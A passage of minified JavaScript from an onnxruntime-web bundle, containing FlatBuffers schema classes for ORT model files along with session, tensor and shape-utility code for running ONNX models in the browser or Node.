i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startOpsetImportVector(builder,numElems){builder.startVector(4,numElems,4)}static addProducerName(builder,producerNameOffset){builder.addFieldOffset(2,producerNameOffset,0)}static addProducerVersion(builder,producerVersionOffset){builder.addFieldOffset(3,producerVersionOffset,0)}static addDomain(builder,domainOffset){builder.addFieldOffset(4,domainOffset,0)}static addModelVersion(builder,modelVersion){builder.addFieldInt64(5,modelVersion,builder.createLong(0,0))}static addDocString(builder,docStringOffset){builder.addFieldOffset(6,docStringOffset,0)}static addGraph(builder,graphOffset){builder.addFieldOffset(7,graphOffset,0)}static addGraphDocString(builder,graphDocStringOffset){builder.addFieldOffset(8,graphDocStringOffset,0)}static endModel(builder){return builder.endObject()}static createModel(builder,irVersion,opsetImportOffset,producerNameOffset,producerVersionOffset,domainOffset,modelVersion,docStringOffset,graphOffset,graphDocStringOffset){return Model.startModel(builder),Model.addIrVersion(builder,irVersion),Model.addOpsetImport(builder,opsetImportOffset),Model.addProducerName(builder,producerNameOffset),Model.addProducerVersion(builder,producerVersionOffset),Model.addDomain(builder,domainOffset),Model.addModelVersion(builder,modelVersion),Model.addDocString(builder,docStringOffset),Model.addGraph(builder,graphOffset),Model.addGraphDocString(builder,graphDocStringOffset),Model.endModel(builder)}}fbs.Model=Model}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class KernelCreateInfos{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsKernelCreateInfos(bb,obj){return(obj||new KernelCreateInfos).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsKernelCreateInfos(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new KernelCreateInfos).__init(bb.readInt32(bb.position())+bb.position(),bb)}nodeIndices(index){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.readUint32(this.bb.__vector(this.bb_pos+offset)+4*index):0}nodeIndicesLength(){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.__vector_len(this.bb_pos+offset):0}nodeIndicesArray(){let offset=this.bb.__offset(this.bb_pos,4);return offset?new Uint32Array(this.bb.bytes().buffer,this.bb.bytes().byteOffset+this.bb.__vector(this.bb_pos+offset),this.bb.__vector_len(this.bb_pos+offset)):null}kernelDefHashes(index){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.readUint64(this.bb.__vector(this.bb_pos+offset)+8*index):this.bb.createLong(0,0)}kernelDefHashesLength(){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.__vector_len(this.bb_pos+offset):0}static startKernelCreateInfos(builder){builder.startObject(2)}static addNodeIndices(builder,nodeIndicesOffset){builder.addFieldOffset(0,nodeIndicesOffset,0)}static createNodeIndicesVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addInt32(data[i]);return builder.endVector()}static startNodeIndicesVector(builder,numElems){builder.startVector(4,numElems,4)}static addKernelDefHashes(builder,kernelDefHashesOffset){builder.addFieldOffset(1,kernelDefHashesOffset,0)}static createKernelDefHashesVector(builder,data){builder.startVector(8,data.length,8);for(let i=data.length-1;i>=0;i--)builder.addInt64(data[i]);return builder.endVector()}static startKernelDefHashesVector(builder,numElems){builder.startVector(8,numElems,8)}static endKernelCreateInfos(builder){return builder.endObject()}static createKernelCreateInfos(builder,nodeIndicesOffset,kernelDefHashesOffset){return KernelCreateInfos.startKernelCreateInfos(builder),KernelCreateInfos.addNodeIndices(builder,nodeIndicesOffset),KernelCreateInfos.addKernelDefHashes(builder,kernelDefHashesOffset),KernelCreateInfos.endKernelCreateInfos(builder)}}fbs.KernelCreateInfos=KernelCreateInfos}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class SubGraphSessionState{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsSubGraphSessionState(bb,obj){return(obj||new SubGraphSessionState).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsSubGraphSessionState(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new SubGraphSessionState).__init(bb.readInt32(bb.position())+bb.position(),bb)}graphId(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}sessionState(obj){let offset=this.bb.__offset(this.bb_pos,6);return offset?(obj||new onnxruntime.experimental.fbs.SessionState).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}static startSubGraphSessionState(builder){builder.startObject(2)}static addGraphId(builder,graphIdOffset){builder.addFieldOffset(0,graphIdOffset,0)}static addSessionState(builder,sessionStateOffset){builder.addFieldOffset(1,sessionStateOffset,0)}static endSubGraphSessionState(builder){let offset=builder.endObject();return builder.requiredField(offset,4),offset}static createSubGraphSessionState(builder,graphIdOffset,sessionStateOffset){return SubGraphSessionState.startSubGraphSessionState(builder),SubGraphSessionState.addGraphId(builder,graphIdOffset),SubGraphSessionState.addSessionState(builder,sessionStateOffset),SubGraphSessionState.endSubGraphSessionState(builder)}}fbs.SubGraphSessionState=SubGraphSessionState}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class SessionState{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsSessionState(bb,obj){return(obj||new SessionState).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsSessionState(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new SessionState).__init(bb.readInt32(bb.position())+bb.position(),bb)}kernels(obj){let offset=this.bb.__offset(this.bb_pos,4);return offset?(obj||new onnxruntime.experimental.fbs.KernelCreateInfos).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}subGraphSessionStates(index,obj){let offset=this.bb.__offset(this.bb_pos,6);return offset?(obj||new onnxruntime.experimental.fbs.SubGraphSessionState).__init(this.bb.__indirect(this.bb.__vector(this.bb_pos+offset)+4*index),this.bb):null}subGraphSessionStatesLength(){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.__vector_len(this.bb_pos+offset):0}static startSessionState(builder){builder.startObject(2)}static addKernels(builder,kernelsOffset){builder.addFieldOffset(0,kernelsOffset,0)}static addSubGraphSessionStates(builder,subGraphSessionStatesOffset){builder.addFieldOffset(1,subGraphSessionStatesOffset,0)}static createSubGraphSessionStatesVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startSubGraphSessionStatesVector(builder,numElems){builder.startVector(4,numElems,4)}static endSessionState(builder){return builder.endObject()}static createSessionState(builder,kernelsOffset,subGraphSessionStatesOffset){return SessionState.startSessionState(builder),SessionState.addKernels(builder,kernelsOffset),SessionState.addSubGraphSessionStates(builder,subGraphSessionStatesOffset),SessionState.endSessionState(builder)}}fbs.SessionState=SessionState}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class InferenceSession{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsInferenceSession(bb,obj){return(obj||new InferenceSession).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsInferenceSession(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new InferenceSession).__init(bb.readInt32(bb.position())+bb.position(),bb)}static bufferHasIdentifier(bb){return bb.__has_identifier("ORTM")}ortVersion(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}model(obj){let offset=this.bb.__offset(this.bb_pos,6);return offset?(obj||new onnxruntime.experimental.fbs.Model).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}sessionState(obj){let offset=this.bb.__offset(this.bb_pos,8);return offset?(obj||new onnxruntime.experimental.fbs.SessionState).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}static startInferenceSession(builder){builder.startObject(3)}static addOrtVersion(builder,ortVersionOffset){builder.addFieldOffset(0,ortVersionOffset,0)}static addModel(builder,modelOffset){builder.addFieldOffset(1,modelOffset,0)}static addSessionState(builder,sessionStateOffset){builder.addFieldOffset(2,sessionStateOffset,0)}static endInferenceSession(builder){return builder.endObject()}static finishInferenceSessionBuffer(builder,offset){builder.finish(offset,"ORTM")}static finishSizePrefixedInferenceSessionBuffer(builder,offset){builder.finish(offset,"ORTM",!0)}static createInferenceSession(builder,ortVersionOffset,modelOffset,sessionStateOffset){return InferenceSession.startInferenceSession(builder),InferenceSession.addOrtVersion(builder,ortVersionOffset),InferenceSession.addModel(builder,modelOffset),InferenceSession.addSessionState(builder,sessionStateOffset),InferenceSession.endInferenceSession(builder)}}fbs.InferenceSession=InferenceSession}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={}))},"./lib/onnxjs/session-handler.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.OnnxjsSessionHandler=void 0;const onnxruntime_common_1=__webpack_require__("../common/dist/cjs/index.js"),tensor_1=__webpack_require__("./lib/onnxjs/tensor.ts");exports.OnnxjsSessionHandler=class OnnxjsSessionHandler{constructor(session){this.session=session,this.inputNames=this.session.inputNames,this.outputNames=this.session.outputNames}async dispose(){}async run(feeds,_fetches,_options){const inputMap=new Map;for(const name in feeds)if(Object.hasOwnProperty.call(feeds,name)){const feed=feeds[name];inputMap.set(name,new tensor_1.Tensor(feed.dims,feed.type,void 0,void 0,feed.data))}const outputMap=await this.session.run(inputMap),output={};return outputMap.forEach(((tensor,name)=>{output[name]=new onnxruntime_common_1.Tensor(tensor.type,tensor.data,tensor.dims)})),output}startProfiling(){this.session.startProfiling()}endProfiling(){this.session.endProfiling()}}},"./lib/onnxjs/session.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.Session=void 0;const fs_1=__webpack_require__("?6c45"),util_1=__webpack_require__("?b3a2"),backend_1=__webpack_require__("./lib/onnxjs/backend.ts"),execution_plan_1=__webpack_require__("./lib/onnxjs/execution-plan.ts"),instrument_1=__webpack_require__("./lib/onnxjs/instrument.ts"),model_1=__webpack_require__("./lib/onnxjs/model.ts");exports.Session=class Session{constructor(config={}){this._initialized=!1,this.backendHint=config.backendHint,this.profiler=instrument_1.Profiler.create(config.profiler),this.context={profiler:this.profiler,graphInputTypes:[],graphInputDims:[]}}get inputNames(){return this._model.graph.getInputNames()}get outputNames(){return this._model.graph.getOutputNames()}startProfiling(){this.profiler.start()}endProfiling(){this.profiler.stop()}async loadModel(arg,byteOffset,length){await this.profiler.event("session","Session.loadModel",(async()=>{const backend=await(0,backend_1.resolveBackend)(this.backendHint);if(this.sessionHandler=backend.createSessionHandler(this.context),this._model=new model_1.Model,"string"==typeof arg){const isOrtFormat=arg.endsWith(".ort");if("undefined"!=typeof process&&process.versions&&process.versions.node){const buf=await(0,util_1.promisify)(fs_1.readFile)(arg);this.initialize(buf,isOrtFormat)}else{const response=await fetch(arg),buf=await response.arrayBuffer();this.initialize(new Uint8Array(buf),isOrtFormat)}}else if(ArrayBuffer.isView(arg))this.initialize(arg);else{const arr=new Uint8Array(arg,byteOffset||0,length||arg.byteLength);this.initialize(arr)}}))}initialize(modelProtoBlob,isOrtFormat){if(this._initialized)throw new Error("already initialized");this.profiler.event("session","Session.initialize",(()=>{const graphInitializer=this.sessionHandler.transformGraph?this.sessionHandler:void 0;this._model.load(modelProtoBlob,graphInitializer,isOrtFormat),this.sessionHandler.onGraphInitialized&&this.sessionHandler.onGraphInitialized(this._model.graph),this.initializeOps(this._model.graph),this._executionPlan=new execution_plan_1.ExecutionPlan(this._model.graph,this._ops,this.profiler)})),this._initialized=!0}async run(inputs){if(!this._initialized)throw new Error("session not initialized yet");return this.profiler.event("session","Session.run",(async()=>{const inputTensors=this.normalizeAndValidateInputs(inputs),outputTensors=await this._executionPlan.execute(this.sessionHandler,inputTensors);return this.createOutput(outputTensors)}))}normalizeAndValidateInputs(inputs){const modelInputNames=this._model.graph.getInputNames();if(Array.isArray(inputs)){if(inputs.length!==modelInputNames.length)throw new Error(`incorrect input array length: expected ${modelInputNames.length} but got ${inputs.length}`)}else{if(inputs.size!==modelInputNames.length)throw new Error(`incorrect input map size: expected ${modelInputNames.length} but got ${inputs.size}`);const sortedInputs=new Array(inputs.size);let sortedInputsIndex=0;for(let i=0;i<modelInputNames.length;++i){const tensor=inputs.get(modelInputNames[i]);if(!tensor)throw new Error(`missing input tensor for: '${name}'`);sortedInputs[sortedInputsIndex++]=tensor}inputs=sortedInputs}if(this.context.graphInputTypes&&0!==this.context.graphInputTypes.length&&this.context.graphInputDims&&0!==this.context.graphInputDims.length)this.validateInputTensorDims(this.context.graphInputDims,inputs,!1);else{const modelInputIndices=this._model.graph.getInputIndices(),modelValues=this._model.graph.getValues(),graphInputDims=new Array(modelInputIndices.length);for(let i=0;i<modelInputIndices.length;++i){const graphInput=modelValues[modelInputIndices[i]];graphInputDims[i]=graphInput.type.shape.dims,this.context.graphInputTypes.push(graphInput.type.tensorType),this.context.graphInputDims.push(inputs[i].dims)}this.validateInputTensorDims(graphInputDims,inputs,!0)}return this.validateInputTensorTypes(this.context.graphInputTypes,inputs),inputs}validateInputTensorTypes(graphInputTypes,givenInputs){for(let i=0;i<givenInputs.length;i++){const expectedType=graphInputTypes[i],actualType=givenInputs[i].type;if(expectedType!==actualType)throw new Error(`input tensor[${i}] check failed: expected type '${expectedType}' but got ${actualType}`)}}validateInputTensorDims(graphInputDims,givenInputs,noneDimSupported){for(let i=0;i<givenInputs.length;i++){const expectedDims=graphInputDims[i],actualDims=givenInputs[i].dims;if(!this.compareTensorDims(expectedDims,actualDims,noneDimSupported))throw new Error(`input tensor[${i}] check failed: expected shape '[${expectedDims.join(",")}]' but got [${actualDims.join(",")}]`)}}compareTensorDims(expectedDims,actualDims,noneDimSupported){if(expectedDims.length!==actualDims.length)return!1;for(let i=0;i<expectedDims.length;++i)if(expectedDims[i]!==actualDims[i]&&(!noneDimSupported||0!==expectedDims[i]))return!1;return!0}createOutput(outputTensors){const modelOutputNames=this._model.graph.getOutputNames();if(outputTensors.length!==modelOutputNames.length)throw new Error("expected number of outputs do not match number of generated outputs");const output=new Map;for(let i=0;i<modelOutputNames.length;++i)output.set(modelOutputNames[i],outputTensors[i]);return output}initializeOps(graph){const nodes=graph.getNodes();this._ops=new Array(nodes.length);for(let i=0;i<nodes.length;i++)this._ops[i]=this.sessionHandler.resolve(nodes[i],this._model.opsets,graph)}}},"./lib/onnxjs/tensor.ts":function(__unused_webpack_module,exports,__webpack_require__){"use strict";var __importDefault=this&&this.__importDefault||function(mod){return mod&&mod.__esModule?mod:{default:mod}};Object.defineProperty(exports,"__esModule",{value:!0}),exports.Tensor=void 0;const guid_typescript_1=__webpack_require__("./node_modules/guid-typescript/dist/guid.js"),long_1=__importDefault(__webpack_require__("./node_modules/long/umd/index.js")),ort_generated_1=__webpack_require__("./lib/onnxjs/ort-schema/flatbuffers/ort-generated.ts"),onnx_1=__webpack_require__("./lib/onnxjs/ort-schema/protobuf/onnx.js"),util_1=__webpack_require__("./lib/onnxjs/util.ts");var ortFbs=ort_generated_1.onnxruntime.experimental.fbs;class Tensor{get data(){if(void 0===this.cache){const data=this.dataProvider(this.dataId);if(data.length!==this.size)throw new Error("Length of data provided by the Data Provider is inconsistent with the dims of this Tensor.");this.cache=data}return this.cache}get stringData(){if("string"!==this.type)throw new TypeError("data type is not string");return this.data}get integerData(){switch(this.type){case"uint8":case"int8":case"uint16":case"int16":case"int32":case"uint32":case"bool":return this.data;default:throw new TypeError("data type is not integer (uint8, int8, uint16, int16, int32, uint32, bool)")}}get floatData(){switch(this.type){case"float32":case"float64":return this.data;default:throw new TypeError("data type is not float (float32, float64)")}}get numberData(){if("string"!==this.type)return this.data;throw new TypeError("type cannot be non-number (string)")}get(indices){return this.data[util_1.ShapeUtil.indicesToOffset(indices,this.strides)]}set(indices,value){this.data[util_1.ShapeUtil.indicesToOffset(indices,this.strides)]=value}async getData(){return void 0===this.cache&&(this.cache=await this.asyncDataProvider(this.dataId)),this.cache}get strides(){return this._strides||(this._strides=util_1.ShapeUtil.computeStrides(this.dims)),this._strides}constructor(dims,type,dataProvider,asyncDataProvider,cache,dataId=guid_typescript_1.Guid.create()){this.dims=dims,this.type=type,this.dataProvider=dataProvider,this.asyncDataProvider=asyncDataProvider,this.cache=cache,this.dataId=dataId,this.size=util_1.ShapeUtil.validateDimsAndCalcSize(dims);const size=this.size,empty=void 0===dataProvider&&void 0===asyncDataProvider&&void 0===cache;if(void 0!==cache&&cache.length!==size)throw new RangeError("Input dims doesn't match data length.");if("string"===type){if(!(void 0===cache||Array.isArray(cache)&&cache.every((i=>"string"==typeof i))))throw new TypeError("cache should be a string array");empty&&(this.cache=new Array(size))}else{if(void 0!==cache){const constructor=dataviewConstructor(type);if(!(cache instanceof constructor))throw new TypeError(`cache should be type ${constructor.name}`)}if(empty){const buf=new ArrayBuffer(size*function sizeof(type){switch(type){case"bool":case"int8":case"uint8":return 1;case"int16":case"uint16":return 2;case"int32":case"uint32":case"float32":return 4;case"float64":return 8;default:throw new Error(`cannot calculate sizeof() on type ${type}`)}}(type));this.cache=function createView(dataBuffer,type){return new(dataviewConstructor(type))(dataBuffer)}(buf,type)}}}static fromProto(tensorProto){if(!tensorProto)throw new Error("cannot construct Value from an empty tensor");const type=util_1.ProtoUtil.tensorDataTypeFromProto(tensorProto.dataType),dims=util_1.ProtoUtil.tensorDimsFromProto(tensorProto.dims),value=new Tensor(dims,type);if("string"===type)tensorProto.stringData.forEach(((str,i)=>{value.data[i]=(0,util_1.decodeUtf8String)(str)}));else if(tensorProto.rawData&&"number"==typeof tensorProto.rawData.byteLength&&tensorProto.rawData.byteLength>0){const dataDest=value.data,dataSource=new DataView(tensorProto.rawData.buffer,tensorProto.rawData.byteOffset,tensorProto.rawData.byteLength),elementSize=sizeofProto(tensorProto.dataType),length=tensorProto.rawData.byteLength/elementSize;if(tensorProto.rawData.byteLength%elementSize!=0)throw new Error("invalid buffer length");if(dataDest.length!==length)throw new Error("buffer length mismatch");for(let i=0;i<length;i++){const n=readProto(dataSource,tensorProto.dataType,i*elementSize);dataDest[i]=n}}else{let array;switch(tensorProto.dataType){case onnx_1.onnx.TensorProto.DataType.FLOAT:array=tensorProto.floatData;break;case onnx_1.onnx.TensorProto.DataType.INT32:case onnx_1.onnx.TensorProto.DataType.INT16:case onnx_1.onnx.TensorProto.DataType.UINT16:case onnx_1.onnx.TensorProto.DataType.INT8:case onnx_1.onnx.TensorProto.DataType.UINT8:case onnx_1.onnx.TensorProto.DataType.BOOL:array=tensorProto.int32Data;break;case onnx_1.onnx.TensorProto.DataType.INT64:array=tensorProto.int64Data;break;case onnx_1.onnx.TensorProto.DataType.DOUBLE:array=tensorProto.doubleData;break;case onnx_1.onnx.TensorProto.DataType.UINT32:case onnx_1.onnx.TensorProto.DataType.UINT64:array=tensorProto.uint64Data;break;default:throw new Error("unspecific error")}if(null==array)throw new Error("failed to populate data from a tensorproto value");const data=value.data;if(data.length!==array.length)throw new Error("array length mismatch");for(let i=0;i<array.length;i++){const element=array[i];long_1.default.isLong(element)?data[i]=longToNumber(element,tensorProto.dataType):data[i]=element}}return value}static fromData(data,dims,type){return new Tensor(dims,type,void 0,void 0,data)}static fromOrtTensor(ortTensor){if(!ortTensor)throw new Error("cannot construct Value from an empty tensor");const dims=util_1.ProtoUtil.tensorDimsFromORTFormat(ortTensor),type=util_1.ProtoUtil.tensorDataTypeFromProto(ortTensor.dataType()),value=new Tensor(dims,type);if("string"===type)for(let i=0;i<ortTensor.stringDataLength();i++)value.data[i]=ortTensor.stringData(i);else if(ortTensor.rawDataArray()&&"number"==typeof ortTensor.rawDataLength()&&ortTensor.rawDataLength()>0){const dataDest=value.data,dataSource=new DataView(ortTensor.rawDataArray().buffer,ortTensor.rawDataArray().byteOffset,ortTensor.rawDataLength()),elementSize=sizeofProto(ortTensor.dataType()),length=ortTensor.rawDataLength()/elementSize;if(ortTensor.rawDataLength()%elementSize!=0)throw new Error("invalid buffer length");if(dataDest.length!==length)throw new Error("buffer length mismatch");for(let i=0;i<length;i++){const n=readProto(dataSource,ortTensor.dataType(),i*elementSize);dataDest[i]=n}}return value}}function sizeofProto(type){switch(type){case onnx_1.onnx.TensorProto.DataType.UINT8:case onnx_1.onnx.TensorProto.DataType.INT8:case onnx_1.onnx.TensorProto.DataType.BOOL:return 1;case onnx_1.onnx.TensorProto.DataType.UINT16:case onnx_1.onnx.TensorProto.DataType.INT16:return 2;case onnx_1.onnx.TensorProto.DataType.FLOAT:case onnx_1.onnx.TensorProto.DataType.INT32:case onnx_1.onnx.TensorProto.DataType.UINT32:return 4;case onnx_1.onnx.TensorProto.DataType.INT64:case onnx_1.onnx.TensorProto.DataType.DOUBLE:case onnx_1.onnx.TensorProto.DataType.UINT64:return 8;default:throw new Error(`cannot calculate sizeof() on type ${onnx_1.onnx.TensorProto.DataType[type]}`)}}function dataviewConstructor(type){switch(type){case"bool":case"uint8":return Uint8Array;case"int8":return Int8Array;case"int16":return Int16Array;case"uint16":return Uint16Array;case"int32":return Int32Array;case"uint32":return Uint32Array;case"int64":return BigInt64Array;case"float32":return Float32Array;case"float64":return Float64Array;default:throw new Error("unspecified error")}}function longToNumber(i,type){if(type===onnx_1.onnx.TensorProto.DataType.INT64||type===ortFbs.TensorDataType.INT64){if(i.greaterThanOrEqual(2147483648)||i.lessThan(-2147483648))throw new TypeError("int64 is not supported")}else{if(type!==onnx_1.onnx.TensorProto.DataType.UINT32&&type!==ortFbs.TensorDataType.UINT32&&type!==onnx_1.onnx.TensorProto.DataType.UINT64&&type!==ortFbs.TensorDataType.UINT64)throw new TypeError(`not a LONG type: ${onnx_1.onnx.TensorProto.DataType[type]}`);if(i.greaterThanOrEqual(4294967296)||i.lessThan(0))throw new TypeError("uint64 is not supported")}return i.toNumber()}function readProto(view,type,byteOffset){switch(type){case onnx_1.onnx.TensorProto.DataType.BOOL:case onnx_1.onnx.TensorProto.DataType.UINT8:return view.getUint8(byteOffset);case onnx_1.onnx.TensorProto.DataType.INT8:return view.getInt8(byteOffset);case onnx_1.onnx.TensorProto.DataType.UINT16:return view.getUint16(byteOffset,!0);case onnx_1.onnx.TensorProto.DataType.INT16:return view.getInt16(byteOffset,!0);case onnx_1.onnx.TensorProto.DataType.FLOAT:return view.getFloat32(byteOffset,!0);case onnx_1.onnx.TensorProto.DataType.INT32:return view.getInt32(byteOffset,!0);case onnx_1.onnx.TensorProto.DataType.UINT32:return view.getUint32(byteOffset,!0);case onnx_1.onnx.TensorProto.DataType.INT64:return longToNumber(long_1.default.fromBits(view.getUint32(byteOffset,!0),view.getUint32(byteOffset+4,!0),!1),type);case onnx_1.onnx.TensorProto.DataType.DOUBLE:return view.getFloat64(byteOffset,!0);case onnx_1.onnx.TensorProto.DataType.UINT64:return longToNumber(long_1.default.fromBits(view.getUint32(byteOffset,!0),view.getUint32(byteOffset+4,!0),!0),type);default:throw new Error(`cannot read from DataView for type ${onnx_1.onnx.TensorProto.DataType[type]}`)}}exports.Tensor=Tensor},"./lib/onnxjs/util.ts":function(__unused_webpack_module,exports,__webpack_require__){"use strict";var __importDefault=this&&this.__importDefault||function(mod){return mod&&mod.__esModule?mod:{default:mod}};Object.defineProperty(exports,"__esModule",{value:!0}),exports.decodeUtf8String=exports.MAX_CLIP=exports.MIN_CLIP=exports.PoolConvUtil=exports.ReduceUtil=exports.SplitUtil=exports.MathUtil=exports.ShapeUtil=exports.LongUtil=exports.ProtoUtil=exports.GemmUtil=exports.arrayCopyHelper=exports.BroadcastUtil=exports.MatMulUtil=exports.ArrayUtil=exports.assert=exports.checkInputsShape=void 0;const flatbuffers_1=__webpack_require__("./node_modules/flatbuffers/js/flatbuffers.mjs"),long_1=__importDefault(__webpack_require__("./node_modules/long/umd/index.js")),onnx_1=__webpack_require__("./lib/onnxjs/ort-schema/protobuf/onnx.js"),tensor_1=__webpack_require__("./lib/onnxjs/tensor.ts");exports.checkInputsShape=function checkInputsShape(inputs,...expectedDimensions){if(!inputs||inputs.length!==expectedDimensions.length)return!1;for(let i=0;i<inputs.length;i++)if(!inputs[i].dims||inputs[i].dims.length!==expectedDimensions[i])return!1;return!0},exports.assert=function assert(expr,msg){if(!expr)throw new Error("string"==typeof msg?msg:msg())};exports.ArrayUtil=class ArrayUtil{static arraysEqual(n1,n2){if(n1.length!==n2.length)return!1;for(let i=0;i<n1.length;i++)if(n1[i]!==n2[i])return!1;return!0}};class MatMulUtil{static preprocessInputShapes(dimsA,dimsB){return[1===dimsA.length?[1,dimsA[0]]:dimsA,1===dimsB.length?[dimsB[0],1]:dimsB]}static postprocessOutputShape(outputShape,aRank,bRank){1===aRank&&outputShape.splice(outputShape.length-2,1),1===bRank&&outputShape.pop()}static calcMatMulShape(a,b){return a[1]!==b[0]?void 0:[a[0],b[1]]}}exports.MatMulUtil=MatMulUtil;class BroadcastUtil{static calcShape(adims,bdims,isMatMul=!1){const arank=adims.length,brank=bdims.length;if(0===arank)return bdims;if(0===brank)return adims;const crank=Math.max(adims.length,bdims.length),cdims=new Array(crank);if(isMatMul){if(arank<2||brank<2)return;const cShapeMatMul=MatMulUtil.calcMatMulShape([adims[arank-2],adims[arank-1]],[bdims[brank-2],bdims[brank-1]]);if(void 0===cShapeMatMul)return;[cdims[crank-2],cdims[crank-1]]=cShapeMatMul}for(let i=isMatMul?3:1;i<=crank;i++){const aLen=arank-i<0?1:adims[arank-i],bLen=brank-i<0?1:bdims[brank-i];if(aLen!==bLen&&aLen>1&&bLen>1)return;cdims[crank-i]=Math.max(aLen,bLen)}return cdims}static index(broadcastedIndices,originalShape){const originalIndices=new Array(originalShape.length);return BroadcastUtil.fillIndex(broadcastedIndices,originalShape,originalIndices),originalIndices}static fillIndex(broadcastedIndices,originalShape,originalIndices){const dimOffset=broadcastedIndices.length-originalShape.length;for(let i=0;i<originalShape.length;i++)originalIndices[i]=broadcastedIndices[dimOffset+i]%originalShape[i]}static calc(a,b,op,inplace,resultType){const outputShape=BroadcastUtil.calcShape(a.dims,b.dims);if(outputShape){if(inplace&&!ShapeUtil.areEqual(outputShape,a.dims))return;const size=ShapeUtil.size(outputShape),c=inplace?a:new tensor_1.Tensor(outputShape,resultType||a.type);if(0===outputShape.length)c.set([],op(a.get([]),b.get([])));else{const outputIndices=new Array(outputShape.length),originalIndicesA=new Array(a.dims.length),originalIndicesB=new Array(b.dims.length);let rest,valA=0,valB=0,isAScalar=!1,isBScalar=!1;0===a.dims.length&&(valA=a.get([]),isAScalar=!0),0===b.dims.length&&(valB=b.get([]),isBScalar=!0);for(let i=0;i<size;i++){rest=i;for(let j=outputShape.length-1;j>=0;j--)outputIndices[j]=rest%outputShape[j],rest=Math.floor(rest/outputShape[j]);isAScalar||(BroadcastUtil.fillIndex(outputIndices,a.dims,originalIndicesA),valA=a.get(originalIndicesA)),isBScalar||(BroadcastUtil.fillIndex(outputIndices,b.dims,originalIndicesB),valB=b.get(originalIndicesB)),c.set(outputIndices,op(valA,valB))}}return c}}static isValidBroadcast(shape,finalShape){const inputRank=shape.length,finalRank=finalShape.length;if(inputRank>finalRank)return!1;for(let i=1;i<=inputRank;i++)if(1!==shape[inputRank-i]&&shape[inputRank-i]!==finalShape[finalRank-i])return!1;return!0}static getBroadcastDims(inputShape,outputShape){const inRank=inputShape.length,dims=[];for(let i=0;i<inRank;i++){const dim=inRank-1-i,a=inputShape[dim]||1;(outputShape[outputShape.length-1-i]||1)>1&&1===a&&dims.unshift(dim)}return dims}}exports.BroadcastUtil=BroadcastUtil,exports.arrayCopyHelper=function arrayCopyHelper(target,source,targetIndex,sourceIndex,blockSize){if(sourceIndex<0||sourceIndex>=source.length)throw new Error("sourceIndex out of bounds");if(targetIndex<0||targetIndex>=target.length)throw new Error("targetIndex out of bounds");if(sourceIndex+blockSize>source.length)throw new Error("source indices to be copied are outside bounds");if(targetIndex+blockSize>target.length)throw new Error("target array is too small to hold result");for(let offset=0;offset<blockSize;offset++)target[targetIndex+offset]=source[sourceIndex+offset]};exports.GemmUtil=class GemmUtil{static getShapeOfGemmResult(leftShape,transLeft,rightShape,transRight,biasShape){if(2!==leftShape.length||2!==rightShape.length)throw new Error("shape need to be of size 2");let M,K,N;transLeft?(M=leftShape[1],K=leftShape[0]):(M=leftShape[0],K=leftShape[1]);let kDim=-1;if(transRight?(N=rightShape[0],kDim=1):(N=rightShape[1],kDim=0),rightShape[kDim]!==K)throw new Error("dimension mismatch");if(M<=0||N<=0||K<=0)throw new Error("invalid shape specified");if(biasShape&&!BroadcastUtil.isValidBroadcast(biasShape,[M,N]))throw new Error("gemm: invalid bias shape for broadcast");return[M,N,K]}};class ProtoUtil{static tensorDataTypeFromProto(typeProto){switch(typeProto){case 